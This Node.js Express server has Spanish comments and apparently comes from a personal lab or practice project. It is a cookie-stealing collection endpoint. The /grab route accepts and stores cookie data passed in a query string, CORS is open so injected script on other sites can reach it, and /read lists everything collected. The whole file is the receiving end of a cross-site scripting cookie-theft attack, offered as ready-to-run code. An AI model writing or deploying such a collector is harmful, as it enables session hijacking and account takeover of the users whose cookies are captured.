const express = require('express');
const app = express();
const cors = require('cors');
app.use(cors());

let cookiesAlmacenadas = "";  // Aquí se almacenarán las cookies

app.get('/', (req, res) => {
    res.send('pagina principal: siuuu');
});

// Almacena las cookies enviadas
app.get('/grab', (req, res) => {
    const data = req.query.data;
    cookiesAlmacenadas += data + "; ";  // Acumula las cookies
    res.send(data);  // Envía una respuesta con las cookies que se acaban de almacenar
});

// Muestra todas las cookies almacenadas
app.get('/read', (req, res) => {
    res.send(cookiesAlmacenadas);  // Envía todas las cookies almacenadas
});

app.listen(3000, () => {
    console.log('Servidor escuchando en el puerto 3000');
});
